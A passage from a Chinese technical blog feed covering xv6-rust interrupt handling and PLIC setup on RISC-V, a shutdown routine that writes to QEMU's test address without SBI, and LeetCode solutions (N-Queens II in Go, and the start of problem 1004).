在这里我们需要设置<code>sie</code>寄存器为可写的并且设置其<code>SEIE</code>、<code>STIE</code>以及<code>SSIE</code>位。</p>
<p>其中，<code>SEIE</code>设置表明开启S态外部中断；<code>STIE</code>表示开启S态时钟中断；<code>SSIE</code>设置表明开启S态软件中断。</p>
<h3 id="开启中断"><a class="markdownIt-Anchor" href="#开启中断"></a> 开启中断</h3>
<p>首先我们在<code>trapinit</code>函数里面将<code>kernelvec</code>作为地址写入<code>stvec</code>寄存器中，<code>stvec</code>寄存器为<code>Supervisor Trap Vector Base Address Register</code>，包括向量基地址以及向量模式。如此一来，当我们的操作系统内核检测到发生中断后，就去<code>stvec</code>去查看处理陷阱函数的地址，随后进入其中进行陷阱处理。</p>
<p>其中，我们的陷阱处理函数由一段汇编表示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global kertrap</span><br><span class="line">.globl kernelvec</span><br><span class="line">.align 4</span><br><span class="line">kernelvec:</span><br><span class="line">        &#x2F;&#x2F; make room to save registers.</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; save the registers.</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line">        sd sp, 8(sp)</span><br><span class="line">        sd gp, 16(sp)</span><br><span class="line">        sd tp, 24(sp)</span><br><span class="line">        sd t0, 32(sp)</span><br><span class="line">        sd t1, 40(sp)</span><br><span class="line">        sd t2, 48(sp)</span><br><span class="line">        sd s0, 56(sp)</span><br><span class="line">        sd s1, 64(sp)</span><br><span class="line">        sd a0, 72(sp)</span><br><span class="line">        sd a1, 80(sp)</span><br><span class="line">        sd a2, 88(sp)</span><br><span class="line">        sd a3, 96(sp)</span><br><span class="line">        sd a4, 104(sp)</span><br><span class="line">        sd a5, 112(sp)</span><br><span class="line">        sd a6, 120(sp)</span><br><span class="line">        sd a7, 128(sp)</span><br><span class="line">        sd s2, 136(sp)</span><br><span class="line">        sd s3, 144(sp)</span><br><span class="line">        sd s4, 152(sp)</span><br><span class="line">        sd s5, 160(sp)</span><br><span class="line">        sd s6, 168(sp)</span><br><span class="line">        sd s7, 176(sp)</span><br><span class="line">        sd s8, 184(sp)</span><br><span class="line">        sd s9, 192(sp)</span><br><span class="line">        sd s10, 200(sp)</span><br><span class="line">        sd s11, 208(sp)</span><br><span class="line">        sd t3, 216(sp)</span><br><span class="line">        sd t4, 224(sp)</span><br><span class="line">        sd t5, 232(sp)</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; call the C trap handler in trap.rs</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; restore registers.</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        ld gp, 16(sp)</span><br><span class="line">        &#x2F;&#x2F; not this, in case we moved CPUs: ld tp, 24(sp)</span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line">        ld t1, 40(sp)</span><br><span class="line">        ld t2, 48(sp)</span><br><span class="line">        ld s0, 56(sp)</span><br><span class="line">        ld s1, 64(sp)</span><br><span class="line">        ld a0, 72(sp)</span><br><span class="line">        ld a1, 80(sp)</span><br><span class="line">        ld a2, 88(sp)</span><br><span class="line">        ld a3, 96(sp)</span><br><span class="line">        ld a4, 104(sp)</span><br><span class="line">        ld a5, 112(sp)</span><br><span class="line">        ld a6, 120(sp)</span><br><span class="line">        ld a7, 128(sp)</span><br><span class="line">        ld s2, 136(sp)</span><br><span class="line">        ld s3, 144(sp)</span><br><span class="line">        ld s4, 152(sp)</span><br><span class="line">        ld s5, 160(sp)</span><br><span class="line">        ld s6, 168(sp)</span><br><span class="line">        ld s7, 176(sp)</span><br><span class="line">        ld s8, 184(sp)</span><br><span class="line">        ld s9, 192(sp)</span><br><span class="line">        ld s10, 200(sp)</span><br><span class="line">        ld s11, 208(sp)</span><br><span class="line">        ld t3, 216(sp)</span><br><span class="line">        ld t4, 224(sp)</span><br><span class="line">        ld t5, 232(sp)</span><br><span class="line">        ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; return to whatever we were doing in the kernel.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>
<p>可以看到，我们将必要的寄存器值保存进栈里，然后调用<code>kerneltrap</code>这个函数进行内核陷阱的处理，当我们执行完<code>kerneltrap</code>函数返回后，我们将栈内容恢复，并将保存的上下文内容恢复，随后执行<code>sret</code>指令返回发生陷阱的指令后继续进行运行。</p>
<h3 id="开启plic"><a class="markdownIt-Anchor" href="#开启plic"></a> 开启PLIC</h3>
<p><code>PLIC</code>为<code>the riscv Platform Level Interrupt Controller</code>，其作用如下图所示:<br>
<img src="/2021/05/03/xv6-rust-interrupt/PLIC.jpg" alt><br>
<img src="/2021/05/03/xv6-rust-interrupt/PLICArch.jpg" alt><br>
可以看到<code>PLIC</code>接收到中断后将其转发给不同的<code>Hart</code>来使其处理。</p>
<p><code>PLIC</code>结构如上图所示, 当<code>PLIC</code>接收到中断信号后，在内部进行逻辑的信号处理，最后输出信号给对应的CPU进行处理。</p>
<p>而在<code>QEMU</code>平台下，我们不需要去接入具体的外部设备，只需要向<code>QEMU</code>提供的测试地址内写入一些值，即可开启外部中断的检测。</p>
<p>例如在<code>xv6-rust</code>中的<code>plicinit</code>函数：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">unsafe</span> <span class="function"><span class="keyword">fn</span> <span class="title">plicinit</span></span>()&#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;plic init......&quot;</span>);</span><br><span class="line">    <span class="comment">// set desired IRQ priorities non-zero (otherwise disabled).</span></span><br><span class="line">    <span class="keyword">let</span> plic:<span class="built_in">usize</span> = <span class="built_in">Into</span>::&lt;<span class="built_in">usize</span>&gt;::into(memlayout::PLIC);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> addr = plic + memlayout::UART0_IRQ*<span class="number">4</span>;</span><br><span class="line">    ptr::write_volatile(addr <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="built_in">u32</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    addr  = plic + memlayout::UART0_IRQ*<span class="number">4</span>;</span><br><span class="line">    ptr::write_volatile(addr <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="built_in">u32</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们只需要将对应的外设的值按规定写入对应的物理地址中，即可开启外设的外部中断机制。</p>
<h3 id="内核中断处理"><a class="markdownIt-Anchor" href="#内核中断处理"></a> 内核中断处理</h3>
<p>当我们进入内核中断处理函数（即<code>kerneltrap</code>）后，我们需要通过<code>scause</code>寄存器的值来获取发生中断或异常的原因，从而根据不同的原因进行处理。而与此同时，我们也需要获取去读取<code>sstatus</code>和<code>sepc</code>寄存器来进行中断间的上下文切换。</p>
<p>其中，<code>sepc</code>寄存器记录了中断或者异常发生的虚拟地址，当我们的中断结束之后，RISC-V会将<code>sepc</code>寄存器的值写入程序计数器以便继续执行，因此我们需要将<code>sepc</code>的值进行修改并重新写入<code>sepc</code>以保存上下文。</p>
<p>同样，<code>sstatus</code>寄存器保存的是当前发生中断或者异常所在特权级，当中断或异常发生在U态的时候，<code>sstatus</code>的<code>SPP</code>位被置为0，然后<code>sret</code>指令后将返回U态；当<code>sstatus</code>的<code>SPP</code>位被置为1时，<code>sret</code>指令将返回S态，这时<code>SPP</code>位仍然被置为0。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// interrupts and exceptions from kernel code go here via kernelvec,</span></span><br><span class="line"><span class="comment">// on whatever the current kernel stack is.</span></span><br><span class="line"><span class="meta">#[no_mangle]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">unsafe</span> <span class="function"><span class="keyword">fn</span> <span class="title">kerneltrap</span></span>(</span><br><span class="line">   arg0: <span class="built_in">usize</span>, arg1: <span class="built_in">usize</span>, arg2: <span class="built_in">usize</span>, _: <span class="built_in">usize</span>,</span><br><span class="line">   _: <span class="built_in">usize</span>, _: <span class="built_in">usize</span>, _: <span class="built_in">usize</span>, which: <span class="built_in">usize</span></span><br><span class="line">) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> sepc = sepc::read();</span><br><span class="line">    <span class="keyword">let</span> sstatus = sstatus::read();</span><br><span class="line">    <span class="keyword">let</span> scause = scause::read();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if !sstatus::is_from_supervisor() &#123;</span></span><br><span class="line">    <span class="comment">//     panic!(&quot;kerneltrap: not from supervisor mode&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sstatus::intr_get() &#123;</span><br><span class="line">        <span class="built_in">panic!</span>(<span class="string">&quot;kerneltrap(): interrupts enabled&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> which_dev = devintr();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> which_dev &#123;</span><br><span class="line">        <span class="number">0</span> =&gt; &#123;</span><br><span class="line">            <span class="comment">// modify sepc to countine running after restoring context</span></span><br><span class="line">            sepc += <span class="number">2</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">let</span> scause = Scause::new(scause);</span><br><span class="line">            <span class="keyword">match</span> scause.cause()&#123;</span><br><span class="line">                Trap::Exception(Exception::Breakpoint) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;BreakPoint!&quot;</span>),</span><br><span class="line"></span><br><span class="line">                Trap::Exception(Exception::LoadFault) =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;Load Fault!&quot;</span>),</span><br><span class="line"></span><br><span class="line">                Trap::Exception(Exception::LoadPageFault) =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;Load Page Fault!&quot;</span>),</span><br><span class="line"></span><br><span class="line">                Trap::Exception(Exception::StorePageFault) =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;Store Page Fault!&quot;</span>),</span><br><span class="line"></span><br><span class="line">                Trap::Exception(Exception::KernelEnvCall) =&gt; kernel_syscall(arg0, arg1, arg2, which),</span><br><span class="line"></span><br><span class="line">                _ =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;Unresolved Trap! scause:&#123;:?&#125;&quot;</span>, scause.cause())</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="number">1</span> =&gt; &#123;</span><br><span class="line">            <span class="built_in">panic!</span>(<span class="string">&quot;Unsolved solution!&quot;</span>);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="number">2</span> =&gt; &#123;</span><br><span class="line">            CPU_MANAGER.yield_proc();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _ =&gt; &#123;</span><br><span class="line">            <span class="built_in">unreachable!</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// store context</span></span><br><span class="line">    sepc::write(sepc);</span><br><span class="line">    sstatus::write(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中,<code>devintr</code>函数则检测其是否为外部中断，时钟中断以及其它中断或异常。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>xv6-rust</tag>
      </tags>
  </entry>
  <entry>
    <title>xv6-rust关机机制</title>
    <url>/2021/04/14/shutdown-without-SBI-in-OS/</url>
    <content><![CDATA[<p>之前在做rCore的时候发现里面的<code>panic()</code>会直接调用sbi_call直接实现<code>shutdown()</code>。由于这次我自己写的OS自己写的bootloader没有使用SBI，于是想去自己去实现一个<code>shutdown</code>的功能。</p>
<p>由于我用的是<code>QEMU</code>来做硬件模拟，于是我去看了一下RustSBI关于<code>shutdown</code>的处理部分：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">handle_ecall</span></span>(extension: <span class="built_in">usize</span>, function: <span class="built_in">usize</span>, param: [<span class="built_in">usize</span>; <span class="number">5</span>]) -&gt; SbiRet &#123;</span><br><span class="line">    <span class="keyword">match</span> extension &#123;</span><br><span class="line">        EXTENSION_RFENCE =&gt; rfence::handle_ecall_rfence(function, param[<span class="number">0</span>], param[<span class="number">1</span>], param[<span class="number">2</span>], param[<span class="number">3</span>], param[<span class="number">4</span>]),</span><br><span class="line">        EXTENSION_TIMER =&gt; <span class="keyword">match</span> () &#123;</span><br><span class="line">            <span class="meta">#[cfg(target_pointer_width = <span class="meta-string">&quot;64&quot;</span>)]</span></span><br><span class="line">            () =&gt; timer::handle_ecall_timer_64(function, param[<span class="number">0</span>]),</span><br><span class="line">            <span class="meta">#[cfg(target_pointer_width = <span class="meta-string">&quot;32&quot;</span>)]</span></span><br><span class="line">            () =&gt; timer::handle_ecall_timer_32(function, param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        &#125;,</span><br><span class="line">        EXTENSION_IPI =&gt; ipi::handle_ecall_ipi(function, param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        EXTENSION_BASE =&gt; base::handle_ecall_base(function, param[<span class="number">0</span>]),</span><br><span class="line">        EXTENSION_HSM =&gt; hsm::handle_ecall_hsm(function, param[<span class="number">0</span>], param[<span class="number">1</span>], param[<span class="number">2</span>]),</span><br><span class="line">        EXTENSION_SRST =&gt; srst::handle_ecall_srst(function, param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        LEGACY_SET_TIMER =&gt; <span class="keyword">match</span> () &#123;</span><br><span class="line">            <span class="meta">#[cfg(target_pointer_width = <span class="meta-string">&quot;64&quot;</span>)]</span></span><br><span class="line">            () =&gt; legacy::set_timer_64(param[<span class="number">0</span>]),</span><br><span class="line">            <span class="meta">#[cfg(target_pointer_width = <span class="meta-string">&quot;32&quot;</span>)]</span></span><br><span class="line">            () =&gt; legacy::set_timer_32(param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        &#125;</span><br><span class="line">        .legacy_void(param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        LEGACY_CONSOLE_PUTCHAR =&gt; legacy::console_putchar(param[<span class="number">0</span>]).legacy_void(param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        LEGACY_CONSOLE_GETCHAR =&gt; legacy::console_getchar().legacy_return(param[<span class="number">1</span>]),</span><br><span class="line">        LEGACY_SEND_IPI =&gt; legacy::send_ipi(param[<span class="number">0</span>]).legacy_void(param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        LEGACY_SHUTDOWN =&gt; legacy::shutdown().legacy_void(param[<span class="number">0</span>], param[<span class="number">1</span>]),</span><br><span class="line">        _ =&gt; SbiRet::not_supported(),</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">shutdown</span></span>() -&gt; SbiRet &#123;</span><br><span class="line">    crate::reset::legacy_reset()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">system_reset</span></span>(reset_type: <span class="built_in">usize</span>, reset_reason: <span class="built_in">usize</span>) -&gt; SbiRet &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(obj) = &amp;*RESET.lock() &#123;</span><br><span class="line">        <span class="keyword">return</span> obj.system_reset(reset_type, reset_reason);</span><br><span class="line">    &#125;</span><br><span class="line">    SbiRet::not_supported()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">legacy_reset</span></span>() -&gt; ! &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(obj) = &amp;*RESET.lock() &#123;</span><br><span class="line">        obj.legacy_reset()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unreachable!</span>(<span class="string">&quot;no reset handler available; this is okay if your platform didn&#x27;t declare a legacy reset handler&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码追溯我们可以看出来<code>RustSBI</code>使用<code>system_reset()</code>来处理关机，而不同平台对应不同的<code>system_reset()</code>功能。</p>
<p>由于我使用的是<code>QEMU</code>，所以我们可以从平台里面找到对应的函数接口：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">impl</span> rustsbi::Reset <span class="keyword">for</span> Reset &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">system_reset</span></span>(&amp;<span class="keyword">self</span>, reset_type: <span class="built_in">usize</span>, reset_reason: <span class="built_in">usize</span>) -&gt; rustsbi::SbiRet &#123;</span><br><span class="line">        <span class="comment">// todo: only exit after all harts finished</span></span><br><span class="line">        <span class="comment">// loop &#123;&#125;</span></span><br><span class="line">        <span class="keyword">const</span> VIRT_TEST: *<span class="keyword">mut</span> <span class="built_in">u32</span> = <span class="number">0x10_0000</span> <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="built_in">u32</span>;</span><br><span class="line">        <span class="comment">// Fail = 0x3333,</span></span><br><span class="line">        <span class="comment">// Pass = 0x5555,</span></span><br><span class="line">        <span class="comment">// Reset = 0x7777,</span></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> value = <span class="keyword">match</span> reset_type &#123;</span><br><span class="line">            rustsbi::reset::RESET_TYPE_SHUTDOWN =&gt; TEST_PASS,</span><br><span class="line">            rustsbi::reset::RESET_TYPE_COLD_REBOOT =&gt; TEST_RESET,</span><br><span class="line">            rustsbi::reset::RESET_TYPE_WARM_REBOOT =&gt; TEST_RESET,</span><br><span class="line">            _ =&gt; TEST_FAIL,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> reset_reason == rustsbi::reset::RESET_REASON_SYSTEM_FAILURE &#123;</span><br><span class="line">            value = TEST_FAIL;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">            core::ptr::write_volatile(VIRT_TEST, value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">unreachable!</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，我们只需要向<code>VIRT_TEST</code>这个物理地址里面写一些值即可实现关机。</p>
<p>明白了RustSBI实现关机的原理，然后回到我们OS中来。</p>
<p>由于实现<code>shutdown()</code>这必须要求我们使用<code>ecall</code>从S Mode切换到M Mode。但幸运的是我们可以通过设置<code>mideleg</code>和<code>medeleg</code>寄存器来将M态的中断代理到S态：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// delegate all interrupts and exceptions to supervisor mode.</span></span><br><span class="line">medeleg::write(<span class="number">0xffff</span>);</span><br><span class="line">mideleg::write(<span class="number">0xffff</span>);</span><br><span class="line">sie::write(sie::read() | sie::SIE::SEIE <span class="keyword">as</span> <span class="built_in">usize</span> | sie::SIE::STIE <span class="keyword">as</span> <span class="built_in">usize</span> | sie::SIE::SSIE <span class="keyword">as</span> <span class="built_in">usize</span>);</span><br></pre></td></tr></table></figure>
<p>然后我们就可以在S态的中断来处理<code>Kernel syscall</code>了。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">Trap::Exception(Exception::KernelEnvCall) =&gt; handler_kernel_syscall(arg7),</span><br></pre></td></tr></table></figure>
<p>在中断时我们可以匹配到<code>KernelEnvCall</code>来对内核的调用进行处理，这里我们遵循SBI的标准，arg7即表示中断的类型。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">handler_kernel_syscall</span></span>(result: <span class="built_in">usize</span>) &#123;</span><br><span class="line">    <span class="keyword">unsafe</span>&#123;</span><br><span class="line">        satp::write(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">match</span> result  &#123;</span><br><span class="line">        SHUTDOWN =&gt; &#123;</span><br><span class="line">             <span class="built_in">println!</span>(<span class="string">&quot;\x1b[1;31mshutdown! Bye~ \x1b[0m&quot;</span>);</span><br><span class="line">            system_reset(</span><br><span class="line">                RESET_TYPE_SHUTDOWN,</span><br><span class="line">                RESET_REASON_NO_REASON</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">// panic!(&quot;sutdown&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _ =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;Unresolved Kernel Syscall&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们必须把<code>satp</code>寄存器置0，否则当我们写入物理地址的时候会直接发生<code>Page Fault</code>。</p>
<p>以上就是内核的处理流程。</p>
<p>而在<code>panic</code>的具体实现中，我们需要去<code>ecall</code>来传入参数：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[panic_handler]</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">panic</span></span>(info: &amp;PanicInfo&lt;<span class="symbol">&#x27;_</span>&gt;) -&gt; ! &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;\x1b[1;31mpanic: &#x27;&#123;&#125;&#x27;\x1b[0m&quot;</span>, info);</span><br><span class="line">    kernel_syscall(SHUTDOWN, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">loop</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">kernel_syscall</span></span>(</span><br><span class="line">    which: <span class="built_in">usize</span>,</span><br><span class="line">    arg0: <span class="built_in">usize</span>,</span><br><span class="line">    arg1: <span class="built_in">usize</span>,</span><br><span class="line">    arg2: <span class="built_in">usize</span>,   </span><br><span class="line">) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ret;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        llvm_asm!(<span class="string">&quot;ecall&quot;</span></span><br><span class="line">            : <span class="string">&quot;=&#123;x10&#125;&quot;</span> (ret)</span><br><span class="line">            : <span class="string">&quot;&#123;x10&#125;&quot;</span> (arg0), <span class="string">&quot;&#123;x11&#125;&quot;</span> (arg1), <span class="string">&quot;&#123;x12&#125;&quot;</span> (arg2), <span class="string">&quot;&#123;x17&#125;&quot;</span> (which)</span><br><span class="line">            : <span class="string">&quot;memory&quot;</span></span><br><span class="line">            : <span class="string">&quot;volatile&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们即可在内核中实现关机。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
        <tag>xv6-rust</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-52-N皇后II</title>
    <url>/2021/02/19/LeetCode-52/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description:</h2>
<p>n 皇后问题 研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。</p>
<p>给你一个整数 n ，返回 n 皇后问题 不同的解决方案的数量。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples:</h2>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/13/queens.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4</span><br><span class="line">输出：2</span><br><span class="line">解释：如上图所示，4 皇后问题存在两个不同的解法。</span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">totalNQueens</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    res := <span class="number">0</span></span><br><span class="line">    board := <span class="built_in">make</span>([][]<span class="keyword">int</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;n; i++&#123;</span><br><span class="line">        board[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, n)</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">0</span>, &amp;board, &amp;res, n)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(row <span class="keyword">int</span>, board *[][]<span class="keyword">int</span>, res *<span class="keyword">int</span>, n <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> row &gt; n<span class="number">-1</span>&#123;</span><br><span class="line">        *res += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index:=<span class="number">0</span>; index&lt;n; index++&#123;</span><br><span class="line">        <span class="keyword">if</span> isValid(*board, row, index, n) &#123;</span><br><span class="line">            (*board)[row][index] = <span class="number">1</span></span><br><span class="line">            dfs(row+<span class="number">1</span>, board, res, n)</span><br><span class="line">            (*board)[row][index] = <span class="number">0</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValid</span><span class="params">(board [][]<span class="keyword">int</span>, row, col, n <span class="keyword">int</span>)</span> <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> row == <span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x:=<span class="number">0</span>; x&lt;row; x++&#123;</span><br><span class="line">        <span class="comment">// 判断列是否冲突</span></span><br><span class="line">        <span class="keyword">if</span> board[x][col] == <span class="number">1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断对角线是否冲突</span></span><br><span class="line">        <span class="keyword">if</span> x+n &gt; row+col &amp;&amp; x&lt; row+col &amp;&amp; board[x][row+col-x] == <span class="number">1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> x+col-row &lt;= n<span class="number">-1</span> &amp;&amp; x+col &gt;= row &amp;&amp; board[x][x+col-row] == <span class="number">1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-1004-最大连续1的个数III</title>
    <url>/2021/02/19/LeetCode-1004/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description:</h2>
<p>给定一个由若干 <code>0</code> 和 <code>1</code> 组成的数组 <code>A</code>，我们最多可以将 <code>K</code> 个值从 0 变成 1 。</p>
<p>返回仅包含 1 的最长（连续）子数组的长度。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples:</h2>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1,1,1,0,0,0,1,1,1,1,0], K &#x3D; 2</span><br><span class="line">输出：6</span><br><span class="line">解释： </span><br><span class="line">[1,1,1,0,0,1,1,1,1,1,1]</span><br><span class="line">粗体数字从 0 翻转到 1，最长的子数组长度为 6。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
